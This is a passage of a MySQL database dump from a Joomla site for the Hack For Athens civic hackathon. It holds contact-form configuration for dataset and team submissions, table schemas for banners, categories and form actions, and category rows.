21:27:49',254,'','','',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00',3,0),(3,'Submit Resources and Datasets','submit-a-resources-datasets',0,1,0,'0000-00-00 00:00:00',2,'{\"to_address\":\"your@email.com\",\"cc_address\":\"\",\"bcc_address\":\"\",\"email_subject\":\"Resource and Dataset Submission | Hack For Athens\",\"jmessenger_user\":\"0\",\"page_subheading\":\"Submit Resources and Datasets\",\"form__width\":{\"text\":\"\",\"select\":\"auto\"},\"customhtml0\":\"Do you have information to share that can be used to build civic solutions? You can help by adding your datasets and resources - contact us and tell us about your data!\",\"customhtml0display\":\"1\",\"customhtml0order\":\"-1000\",\"customhtml1\":\"\",\"customhtml1display\":\"1\",\"customhtml1order\":\"1000\",\"labelsdisplay\":\"1\",\"form_layout\":\"extended\",\"labels__width\":\"150\",\"sender1isemail\":\"1\",\"text__width\":\"270\",\"dropdown__width\":\"270\",\"textarea__width\":\"270\",\"textarea__height\":{\"text\":\"180\",\"select\":\"px\"},\"uploaddisplay\":\"0\",\"uploadmethod\":\"1\",\"upload\":\"Select files to attach\",\"upload_btn\":\"Browse files\",\"reset_attachment_btn\":\"Reset attachments\",\"uploadmax_file_size\":\"102400\",\"upload_filter\":\"1\",\"upload_audio\":\"0\",\"upload_video\":\"0\",\"upload_images\":\"1\",\"upload_documents\":\"1\",\"upload_archives\":\"1\",\"submittext\":\"Submit\",\"submittype\":\"0\",\"resetbutton\":\"0\",\"resettext\":\"Reset\",\"resettype\":\"0\",\"email_sent_action\":\"0\",\"email_sent_text\":\"Thank you for submitting your resource or dataset suggestion, we will review it shortly and be back to you with any questions if need be\",\"email_sent_textdisplay\":\"1\",\"email_sent_page\":\"176\",\"copy_to_submitter\":\"0\",\"email_copy_subject\":\"Thank you for contacting us\",\"email_copy_text\":\"This message is a confirmation that your information has been successfully submitted and will be processed as soon as possible.\",\"email_copy_summary\":\"0\",\"spam_check\":\"1\",\"spam_words\":\"www,http,url=,href=,link=,.txt,shit,fuck\",\"spam_detected_text\":\"We are sorry, but it seems that your message contains unwanted advertising therefore it <b>has been blocked<\\/b>.<br \\/>Please try again avoiding words such as <i>www, http,<\\/i> and similar.\",\"spam_detected_textdisplay\":\"1\",\"stdcaptchadisplay\":\"0\",\"stdcaptcha\":\"Security code\",\"stdcaptchatype\":\"0\",\"stdcaptcha_length\":\"5\",\"stdcaptchawidth\":\"150\",\"stdcaptchaheight\":\"75\",\"stdcaptchafont\":\"-1\",\"stdcaptchafontmin\":\"14\",\"stdcaptchafontmax\":\"20\",\"stdcaptchaangle\":\"20\",\"stdcaptcha_backgroundcolor\":\"#ffffff\",\"stdcaptcha_textcolor\":\"#191919\",\"stdcaptcha_disturbcolor\":\"#c8c8c8\",\"itemgroups\":\"{\\\"0\\\":[{\\\"title\\\":\\\"create new group\\\",\\\"class\\\":\\\"\\\",\\\"ordering\\\":\\\"0\\\",\\\"state\\\":\\\"1\\\"}],\\\"1\\\":[{\\\"title\\\":\\\"Challenge Submission\\\",\\\"ordering\\\":\\\"1\\\",\\\"class\\\":\\\"\\\",\\\"state\\\":\\\"1\\\"}]}\",\"dynamicfields\":\"{\\\"0\\\":[{\\\"b2jDefaultValue\\\":\\\"First and Last Name\\\",\\\"b2jFieldKey\\\":\\\"0\\\",\\\"type\\\":\\\"b2jDynamicText\\\",\\\"b2jFieldName\\\":\\\"Name\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"0\\\"}],\\\"1\\\":[{\\\"b2jFieldRadio\\\":\\\"0\\\",\\\"b2jDefaultValue\\\":\\\"Your Email Address\\\",\\\"b2jFieldKey\\\":\\\"1\\\",\\\"type\\\":\\\"b2jDynamicEmail\\\",\\\"b2jFieldName\\\":\\\"Email\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"1\\\"}],\\\"2\\\":[{\\\"b2jDefaultValue\\\":\\\"\\\",\\\"b2jFieldKey\\\":\\\"2\\\",\\\"type\\\":\\\"b2jDynamicText\\\",\\\"b2jFieldName\\\":\\\"Affiliated Organization\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"1\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"2\\\"}],\\\"5\\\":[{\\\"b2jDefaultValue\\\":\\\"Enter the URL for the dataset here\\\",\\\"b2jFieldKey\\\":\\\"5\\\",\\\"type\\\":\\\"b2jDynamicText\\\",\\\"b2jFieldName\\\":\\\"Dataset\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"3\\\"}],\\\"6\\\":[{\\\"b2jDefaultValue\\\":\\\"Describe the dataset and your envisioned use of it\\\",\\\"b2jFieldKey\\\":\\\"6\\\",\\\"type\\\":\\\"b2jDynamicTextarea\\\",\\\"b2jFieldName\\\":\\\"Description\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"1\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"4\\\"}]}\"}',0,0,1,'','','','','','*','2014-04-23 18:29:42',254,'','2014-04-30 21:27:54',254,'','','',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00',4,0),(4,'Submit Team Information','submit-team-information',0,1,0,'0000-00-00 00:00:00',3,'{\"to_address\":\"your@email.com\",\"cc_address\":\"\",\"bcc_address\":\"\",\"email_subject\":\"Team Information | Hack For Athens\",\"jmessenger_user\":\"0\",\"page_subheading\":\"Team Information\",\"form__width\":{\"text\":\"\",\"select\":\"auto\"},\"customhtml0\":\"Got your team, know which challenge you want to tackle, ready to move forward? Great, let us know the details!\",\"customhtml0display\":\"1\",\"customhtml0order\":\"-1000\",\"customhtml1\":\"By submitting this form, you accept our privacy policy.\",\"customhtml1display\":\"1\",\"customhtml1order\":\"1000\",\"labelsdisplay\":\"1\",\"form_layout\":\"extended\",\"labels__width\":\"150\",\"sender1isemail\":\"1\",\"text__width\":\"270\",\"dropdown__width\":\"270\",\"textarea__width\":\"270\",\"textarea__height\":{\"text\":\"180\",\"select\":\"px\"},\"uploaddisplay\":\"0\",\"uploadmethod\":\"1\",\"upload\":\"Select files to attach\",\"upload_btn\":\"Browse files\",\"reset_attachment_btn\":\"Reset attachments\",\"uploadmax_file_size\":\"102400\",\"upload_filter\":\"1\",\"upload_audio\":\"0\",\"upload_video\":\"0\",\"upload_images\":\"1\",\"upload_documents\":\"1\",\"upload_archives\":\"1\",\"submittext\":\"Submit\",\"submittype\":\"0\",\"resetbutton\":\"0\",\"resettext\":\"Reset\",\"resettype\":\"0\",\"email_sent_action\":\"0\",\"email_sent_text\":\"Thank you for submitting your team\'s information, let\'s get to hacking!\",\"email_sent_textdisplay\":\"1\",\"email_sent_page\":\"176\",\"copy_to_submitter\":\"0\",\"email_copy_subject\":\"Thank you for contacting us\",\"email_copy_text\":\"This message is a confirmation that your information has been successfully submitted and will be processed as soon as possible.\",\"email_copy_summary\":\"0\",\"spam_check\":\"1\",\"spam_words\":\"www,http,url=,href=,link=,.txt,shit,fuck\",\"spam_detected_text\":\"We are sorry, but it seems that your message contains unwanted advertising therefore it <b>has been blocked<\\/b>.<br \\/>Please try again avoiding words such as <i>www, http,<\\/i> and similar.\",\"spam_detected_textdisplay\":\"1\",\"stdcaptchadisplay\":\"0\",\"stdcaptcha\":\"Security code\",\"stdcaptchatype\":\"0\",\"stdcaptcha_length\":\"5\",\"stdcaptchawidth\":\"150\",\"stdcaptchaheight\":\"75\",\"stdcaptchafont\":\"-1\",\"stdcaptchafontmin\":\"14\",\"stdcaptchafontmax\":\"20\",\"stdcaptchaangle\":\"20\",\"stdcaptcha_backgroundcolor\":\"#ffffff\",\"stdcaptcha_textcolor\":\"#191919\",\"stdcaptcha_disturbcolor\":\"#c8c8c8\",\"itemgroups\":\"{\\\"0\\\":[{\\\"title\\\":\\\"create new group\\\",\\\"class\\\":\\\"\\\",\\\"ordering\\\":\\\"0\\\",\\\"state\\\":\\\"1\\\"}],\\\"1\\\":[{\\\"title\\\":\\\"Team Information\\\",\\\"ordering\\\":\\\"1\\\",\\\"class\\\":\\\"\\\",\\\"state\\\":\\\"1\\\"}]}\",\"dynamicfields\":\"{\\\"0\\\":[{\\\"b2jDefaultValue\\\":\\\"\\\",\\\"b2jFieldKey\\\":\\\"0\\\",\\\"type\\\":\\\"b2jDynamicText\\\",\\\"b2jFieldName\\\":\\\"Team Name\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"0\\\"}],\\\"1\\\":[{\\\"b2jDefaultValue\\\":\\\"Please list all team members by first and last name\\\",\\\"b2jFieldKey\\\":\\\"1\\\",\\\"type\\\":\\\"b2jDynamicTextarea\\\",\\\"b2jFieldName\\\":\\\"Members\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"2\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"1\\\"}],\\\"2\\\":[{\\\"b2jDefaultValue\\\":\\\"Please list the challenge your team will be addressed\\\",\\\"b2jFieldKey\\\":\\\"2\\\",\\\"type\\\":\\\"b2jDynamicText\\\",\\\"b2jFieldName\\\":\\\"Challenge\\\",\\\"b2jFieldValue\\\":\\\"\\\",\\\"b2jFieldState\\\":\\\"1\\\",\\\"b2jFieldGroup\\\":\\\"1\\\",\\\"b2jFieldOrdering\\\":\\\"2\\\"}]}\"}',0,0,1,'','','','','','*','2014-04-23 18:53:09',254,'','2014-04-30 21:27:58',254,'','','',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00',2,0);
/*!40000 ALTER TABLE `hfa_b2jcontact_details` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_b2jcontact_sessions`
--

DROP TABLE IF EXISTS `hfa_b2jcontact_sessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_b2jcontact_sessions` (
  `id` varchar(32) NOT NULL,
  `b2jcomid` int(11) NOT NULL,
  `b2jmoduleid` int(11) NOT NULL,
  `bid` int(11) NOT NULL,
  `keyword` varchar(32) NOT NULL,
  `birth` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `data` text,
  UNIQUE KEY `index` (`id`,`b2jcomid`,`b2jmoduleid`,`keyword`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_b2jcontact_sessions`
--

LOCK TABLES `hfa_b2jcontact_sessions` WRITE;
/*!40000 ALTER TABLE `hfa_b2jcontact_sessions` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_b2jcontact_sessions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_b2jcontact_settings`
--

DROP TABLE IF EXISTS `hfa_b2jcontact_settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_b2jcontact_settings` (
  `name` varchar(32) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_b2jcontact_settings`
--

LOCK TABLES `hfa_b2jcontact_settings` WRITE;
/*!40000 ALTER TABLE `hfa_b2jcontact_settings` DISABLE KEYS */;
INSERT INTO `hfa_b2jcontact_settings` VALUES ('captchadrawer','use_gd'),('mimefilter','use_fileinfo'),('dns','disabled');
/*!40000 ALTER TABLE `hfa_b2jcontact_settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_banner_clients`
--

DROP TABLE IF EXISTS `hfa_banner_clients`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_banner_clients` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `contact` varchar(255) NOT NULL DEFAULT '',
  `email` varchar(255) NOT NULL DEFAULT '',
  `extrainfo` text NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `metakey` text NOT NULL,
  `own_prefix` tinyint(4) NOT NULL DEFAULT '0',
  `metakey_prefix` varchar(255) NOT NULL DEFAULT '',
  `purchase_type` tinyint(4) NOT NULL DEFAULT '-1',
  `track_clicks` tinyint(4) NOT NULL DEFAULT '-1',
  `track_impressions` tinyint(4) NOT NULL DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `idx_own_prefix` (`own_prefix`),
  KEY `idx_metakey_prefix` (`metakey_prefix`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_banner_clients`
--

LOCK TABLES `hfa_banner_clients` WRITE;
/*!40000 ALTER TABLE `hfa_banner_clients` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_banner_clients` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_banner_tracks`
--

DROP TABLE IF EXISTS `hfa_banner_tracks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_banner_tracks` (
  `track_date` datetime NOT NULL,
  `track_type` int(10) unsigned NOT NULL,
  `banner_id` int(10) unsigned NOT NULL,
  `count` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`track_date`,`track_type`,`banner_id`),
  KEY `idx_track_date` (`track_date`),
  KEY `idx_track_type` (`track_type`),
  KEY `idx_banner_id` (`banner_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_banner_tracks`
--

LOCK TABLES `hfa_banner_tracks` WRITE;
/*!40000 ALTER TABLE `hfa_banner_tracks` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_banner_tracks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_banners`
--

DROP TABLE IF EXISTS `hfa_banners`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_banners` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cid` int(11) NOT NULL DEFAULT '0',
  `type` int(11) NOT NULL DEFAULT '0',
  `name` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `imptotal` int(11) NOT NULL DEFAULT '0',
  `impmade` int(11) NOT NULL DEFAULT '0',
  `clicks` int(11) NOT NULL DEFAULT '0',
  `clickurl` varchar(200) NOT NULL DEFAULT '',
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `custombannercode` varchar(2048) NOT NULL,
  `sticky` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `params` text NOT NULL,
  `own_prefix` tinyint(1) NOT NULL DEFAULT '0',
  `metakey_prefix` varchar(255) NOT NULL DEFAULT '',
  `purchase_type` tinyint(4) NOT NULL DEFAULT '-1',
  `track_clicks` tinyint(4) NOT NULL DEFAULT '-1',
  `track_impressions` tinyint(4) NOT NULL DEFAULT '-1',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `reset` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `language` char(7) NOT NULL DEFAULT '',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  KEY `idx_state` (`state`),
  KEY `idx_own_prefix` (`own_prefix`),
  KEY `idx_metakey_prefix` (`metakey_prefix`),
  KEY `idx_banner_catid` (`catid`),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_banners`
--

LOCK TABLES `hfa_banners` WRITE;
/*!40000 ALTER TABLE `hfa_banners` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_banners` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_categories`
--

DROP TABLE IF EXISTS `hfa_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_categories` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `asset_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to the #__assets table.',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `lft` int(11) NOT NULL DEFAULT '0',
  `rgt` int(11) NOT NULL DEFAULT '0',
  `level` int(10) unsigned NOT NULL DEFAULT '0',
  `path` varchar(255) NOT NULL DEFAULT '',
  `extension` varchar(50) NOT NULL DEFAULT '',
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `note` varchar(255) NOT NULL DEFAULT '',
  `description` mediumtext NOT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(11) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  `metadesc` varchar(1024) NOT NULL COMMENT 'The meta description for the page.',
  `metakey` varchar(1024) NOT NULL COMMENT 'The meta keywords for the page.',
  `metadata` varchar(2048) NOT NULL COMMENT 'JSON encoded metadata properties.',
  `created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL,
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  KEY `cat_idx` (`extension`,`published`,`access`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_path` (`path`),
  KEY `idx_left_right` (`lft`,`rgt`),
  KEY `idx_alias` (`alias`),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_categories`
--

LOCK TABLES `hfa_categories` WRITE;
/*!40000 ALTER TABLE `hfa_categories` DISABLE KEYS */;
INSERT INTO `hfa_categories` VALUES (1,0,0,0,35,0,'','system','ROOT','root','','',1,0,'0000-00-00 00:00:00',1,'{}','','','',254,'2009-10-18 16:07:09',0,'0000-00-00 00:00:00',0,'*',1),(2,27,1,1,2,1,'hack-for-athens','com_content','Hack For Athens','hack-for-athens','','',1,0,'0000-00-00 00:00:00',1,'{\"category_layout\":\"\",\"image\":\"\"}','','','{\"author\":\"\",\"robots\":\"\"}',254,'2010-06-28 13:26:37',254,'2013-04-04 02:38:02',0,'*',1),(3,28,1,3,4,1,'uncategorised','com_banners','Uncategorised','uncategorised','','',1,0,'0000-00-00 00:00:00',1,'{\"target\":\"\",\"image\":\"\",\"foobar\":\"\"}','','','{\"page_title\":\"\",\"author\":\"\",\"robots\":\"\"}',254,'2010-06-28 13:27:35',0,'0000-00-00 00:00:00',0,'*',1),(4,29,1,5,6,1,'uncategorised','com_contact','Uncategorised','uncategorised','','',1,0,'0000-00-00 00:00:00',1,'{\"target\":\"\",\"image\":\"\"}','','','{\"page_title\":\"\",\"author\":\"\",\"robots\":\"\"}',254,'2010-06-28 13:27:57',0,'0000-00-00 00:00:00',0,'*',1),(5,30,1,7,8,1,'uncategorised','com_newsfeeds','Uncategorised','uncategorised','','',1,0,'0000-00-00 00:00:00',1,'{\"target\":\"\",\"image\":\"\"}','','','{\"page_title\":\"\",\"author\":\"\",\"robots\":\"\"}',254,'2010-06-28 13:28:15',0,'0000-00-00 00:00:00',0,'*',1),(6,31,1,9,10,1,'uncategorised','com_weblinks','Uncategorised','uncategorised','','',1,0,'0000-00-00 00:00:00',1,'{\"target\":\"\",\"image\":\"\"}','','','{\"page_title\":\"\",\"author\":\"\",\"robots\":\"\"}',254,'2010-06-28 13:28:33',0,'0000-00-00 00:00:00',0,'*',1),(7,32,1,11,12,1,'uncategorised','com_users','Uncategorised','uncategorised','','',1,0,'0000-00-00 00:00:00',1,'{\"target\":\"\",\"image\":\"\"}','','','{\"page_title\":\"\",\"author\":\"\",\"robots\":\"\"}',254,'2010-06-28 13:28:33',0,'0000-00-00 00:00:00',0,'*',1),(8,37,1,13,14,1,'basic','com_rokcandy','Basic','basic','','',1,0,'0000-00-00 00:00:00',1,'','','','',254,'2013-02-15 15:17:55',0,'0000-00-00 00:00:00',0,'',1),(9,38,1,15,16,1,'typography','com_rokcandy','Typography','typography','','',1,0,'0000-00-00 00:00:00',1,'','','','',254,'2013-02-15 15:17:55',0,'0000-00-00 00:00:00',0,'',1),(10,39,1,17,18,1,'uncategorised','com_rokcandy','Uncategorised','uncategorised','','',1,0,'0000-00-00 00:00:00',1,'','','','',254,'2013-02-15 15:17:55',0,'0000-00-00 00:00:00',0,'',1),(11,42,1,19,20,1,'demo-articles','com_content','Demo Articles','demo-articles','','',-2,0,'0000-00-00 00:00:00',1,'{\"category_layout\":\"\",\"image\":\"\"}','','','{\"author\":\"\",\"robots\":\"\"}',254,'2013-02-15 15:21:01',0,'0000-00-00 00:00:00',0,'*',1),(12,43,1,21,22,1,'sample-content','com_content','Sample Content','sample-content','','',-2,0,'0000-00-00 00:00:00',1,'{\"category_layout\":\"\",\"image\":\"\"}','','','{\"author\":\"\",\"robots\":\"\"}',254,'2013-02-15 15:21:08',0,'0000-00-00 00:00:00',0,'*',1),(13,44,1,23,24,1,'roksprocket-mosaic','com_content','RokSprocket Mosaic','roksprocket-mosaic','','',-2,0,'0000-00-00 00:00:00',1,'{\"category_layout\":\"\",\"image\":\"\"}','','','{\"author\":\"\",\"robots\":\"\"}',254,'2013-02-15 15:21:27',0,'0000-00-00 00:00:00',0,'*',1),(14,45,1,25,26,1,'roksprocket-tabs','com_content','RokSprocket Tabs','roksprocket-tabs','','',-2,0,'0000-00-00 00:00:00',1,'{\"category_layout\":\"\",\"image\":\"\"}','','','{\"author\":\"\",\"robots\":\"\"}',254,'2013-02-15 15:21:38',0,'0000-00-00 00:00:00',0,'*',1),(15,46,1,27,28,1,'roksprocket-lists','com_content','RokSprocket Lists','roksprocket-lists','','',-2,0,'0000-00-00 00:00:00',1,'{\"category_layout\":\"\",\"image\":\"\"}','','','{\"author\":\"\",\"robots\":\"\"}',254,'2013-02-15 15:21:46',0,'0000-00-00 00:00:00',0,'*',1),(16,47,1,29,30,1,'frontpage-content','com_content','Frontpage Content','frontpage-content','','',1,0,'0000-00-00 00:00:00',1,'{\"category_layout\":\"\",\"image\":\"\"}','','','{\"author\":\"\",\"robots\":\"\"}',254,'2013-02-15 15:22:03',0,'0000-00-00 00:00:00',0,'*',1),(17,67,1,31,32,1,'rockettheme','com_weblinks','RocketTheme','rockettheme','','<div class=\"rt-image rt-floatleft\">\r\n    <img class=\"rt-noborder\" alt=\"RocketTheme WebLinks\" src=\"images/rocketlauncher/weblinks/rockettheme.png\" />\r\n</div>\r\n\r\n<p>RocketTheme provides Premium Professional Themes and Templates for OpenSource Platforms: Joomla, Wordpress, phpBB3, Magento &amp; More</p>\r\n\r\n<p>The RocketTheme Template Club features exclusive access to professional templates to help transform your site &amp; set you apart from the competition.</p>\r\n\r\n<div class=\"clear\"></div>',1,0,'0000-00-00 00:00:00',1,'{\"category_layout\":\"\",\"image\":\"\"}','','','{\"author\":\"\",\"robots\":\"\"}',254,'2013-02-15 15:45:50',0,'0000-00-00 00:00:00',0,'*',1),(18,107,1,33,34,1,'challenges','com_content','Challenges','challenges','','',1,0,'0000-00-00 00:00:00',1,'{\"category_layout\":\"\",\"image\":\"\"}','','','{\"author\":\"\",\"robots\":\"\"}',254,'2013-05-21 19:57:36',0,'0000-00-00 00:00:00',0,'*',1);
/*!40000 ALTER TABLE `hfa_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_chronoengine_extensions`
--

DROP TABLE IF EXISTS `hfa_chronoengine_extensions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_chronoengine_extensions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `addon_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `enabled` tinyint(1) NOT NULL,
  `ordering` int(4) NOT NULL,
  `settings` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_chronoengine_extensions`
--

LOCK TABLES `hfa_chronoengine_extensions` WRITE;
/*!40000 ALTER TABLE `hfa_chronoengine_extensions` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_chronoengine_extensions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_chronoform_actions`
--

DROP TABLE IF EXISTS `hfa_chronoform_actions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_chronoform_actions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `chronoform_id` int(11) NOT NULL,
  `type` varchar(255) NOT NULL,
  `enabled` tinyint(1) NOT NULL,
  `params` longtext NOT NULL,
  `order` int(11) NOT NULL,
  `content1` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=973 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_chronoform_actions`
--

LOCK TABLES `hfa_chronoform_actions` WRITE;
/*!40000 ALTER TABLE `hfa_chronoform_actions` DISABLE KEYS */;
INSERT INTO `hfa_chronoform_actions` VALUES (667,2,'load_js',1,'{\"dynamic_file\":\"0\"}',0,''),(668,2,'load_css',1,'{}',1,''),(669,2,'load_captcha',1,'{\"fonts\":\"1\",\"encoded_image\":\"0\",\"refresh_button\":\"0\"}',2,''),(670,2,'show_html',1,'{}',3,''),(671,2,'event_loop',1,'{}',5,''),(672,2,'check_captcha',1,'{\"error\":\"You have entered a wrong verification code!\"}',4,''),(673,2,'event_loop',1,'{}',7,''),(674,2,'upload_files',0,'{\"files\":\"\",\"array_fields\":\"\",\"upload_path\":\"\",\"max_size\":\"1000000\",\"min_size\":\"0\",\"max_error\":\"Sorry, Your uploaded file size exceeds the allowed limit.\",\"min_error\":\"Sorry, Your uploaded file size is less than the minimum limit.\",\"type_error\":\"Sorry, Your uploaded file type is not allowed.\",\"safe_file_name\":\"1\"}',6,''),(675,2,'custom_code',1,'{\"mode\":\"controller\",\"action_label\":\"\"}',8,''),(676,2,'handle_arrays',1,'{}',16,''),(677,2,'db_save',1,'{\"table_name\":\"hfa_chronoforms_data_Datasets\",\"model_id\":\"chronoform_data\",\"save_under_modelid\":\"0\",\"params_fields\":\"\",\"ndb_enable\":\"0\",\"ndb_driver\":\"mysql\",\"ndb_host\":\"localhost\",\"ndb_user\":\"\",\"ndb_password\":\"\",\"ndb_database\":\"\",\"ndb_table_name\":\"\",\"ndb_prefix\":\"jos_\"}',9,''),(678,2,'email',1,'{\"to\":\"support@hackforathens.org\",\"cc\":\"\",\"bcc\":\"\",\"subject\":\"Sponsor Application\",\"fromname\":\"Hack For Athens\",\"fromemail\":\"support@hackforathens.org\",\"replytoname\":\"\",\"replytoemail\":\"\",\"dto\":\"\",\"dcc\":\"\",\"dbcc\":\"\",\"dsubject\":\"\",\"dfromname\":\"\",\"dfromemail\":\"\",\"dreplytoname\":\"\",\"dreplytoemail\":\"\",\"recordip\":\"1\",\"attachments\":\"attachments_13,attachments_16\",\"sendas\":\"html\",\"action_label\":\"\",\"encrypt_enabled\":\"0\",\"gpg_sec_key\":\"\",\"replace_nulls\":\"1\"}',10,'<table border=\"0\" cellspacing=\"5\" 